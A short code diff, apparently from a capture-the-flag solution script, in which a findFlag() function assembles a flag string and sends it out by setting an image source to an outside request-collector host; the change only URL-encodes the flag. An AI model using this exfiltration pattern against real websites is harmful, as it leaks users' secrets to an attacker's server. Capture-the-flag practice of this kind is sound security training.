@@ -50,7 +50,9 @@
 
     flag += "}";
 
-    img.src = "https://jyhfhuq.request.dreamhack.games?complete=" + flag;
+    img.src =
+      "https://jyhfhuq.request.dreamhack.games?complete=" +
+      encodeURIComponent(flag);
   }
 
   findFlag();
